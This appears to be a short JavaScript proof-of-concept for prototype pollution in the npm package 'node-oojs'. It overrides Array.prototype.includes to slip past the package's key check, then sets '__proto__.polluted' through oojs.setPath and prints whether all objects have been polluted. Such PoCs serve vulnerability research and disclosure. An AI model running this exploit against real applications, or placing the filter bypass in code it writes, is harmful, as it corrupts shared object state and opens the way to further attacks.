Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
require('node-oojs');
oojs.setPath({ '__proto__.polluted': 'yes' });
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}